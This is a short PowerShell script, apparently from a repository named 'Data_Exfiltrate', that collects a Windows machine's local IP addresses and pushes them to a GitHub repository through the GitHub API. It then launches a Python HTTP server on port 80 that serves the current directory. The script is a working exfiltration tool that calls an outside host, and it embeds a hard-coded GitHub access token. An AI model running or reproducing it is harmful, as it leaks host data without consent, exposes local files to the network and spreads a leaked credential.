# Define variables
$githubToken = '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' # Replace with your GitHub token
$repoOwner = 'selvaganesh-s' # Replace with your GitHub username
$repoName = 'Data_Exfiltrate' # Replace with your repository name
$fileName = 'ip_add' # The name of the file to be created
$branch = 'main' # Branch name where the file will be created
$pythonPath = 'C:\Program Files\Python312\python.exe' # Update with your Python 3 path

# Get the local IP address of the machine
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAdress -notmatch "169.254.*" } | Select-Object -First 3).IPAddress

# Create a JSON payload for creating a new file in the repository
$payload = @{
    "message" = "Create new file with local IP address"
    "content" = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($localIP))
    "branch" = $branch
} | ConvertTo-Json

# Define file path
$filePath = $fileName

# Create a new file in the GitHub repository
$response = Invoke-RestMethod -Uri "https://api.github.com/repos/$repoOwner/$repoName/contents/$filePath" -Method Put -Headers @{
    "Authorization" = "token $githubToken"
    "User-Agent" = "PowerShell"
} -Body $payload -ContentType "application/json"

# Output the URL of the new file in the repository
$response.content.download_url

# Start the HTTP server
Start-Process -FilePath $pythonPath -ArgumentList "-m http.server 80" -NoNewWindow -PassThru
